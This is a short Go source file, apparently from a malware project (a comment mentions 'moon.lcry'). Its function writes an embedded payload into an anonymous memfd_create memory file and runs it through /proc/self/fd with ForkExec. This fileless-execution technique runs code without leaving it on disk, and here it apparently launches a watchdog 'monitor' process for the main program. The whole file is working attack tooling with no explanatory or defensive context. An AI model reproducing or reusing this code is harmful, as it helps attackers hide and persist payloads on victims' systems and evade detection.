package core

import(
	"fmt"
    "log"
	"syscall"
	"unsafe"
)

const (
	mfdCloexec  = 0x1 // flag
	memfdCreate = 319 // syscall number
)

// MonitoringTheMonitor -> Monitor for moon.lcry
func MonitoringTheMonitor(target string) {
	fdName := ""
	fd, _, _ := syscall.Syscall(memfdCreate, uintptr(unsafe.Pointer(&fdName)), uintptr(mfdCloexec), 0)

	_, err := syscall.Write(int(fd), *monitorCode)

	if err != nil {
		log.Fatal(err)
	}

	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)
	argvs := []string{fdPath}
	env := []string{"HOME=" + target}

	if _, err = syscall.ForkExec(fdPath, argvs, &syscall.ProcAttr{Env: env}); err != nil {
		log.Fatal(err)
	}

    return
}
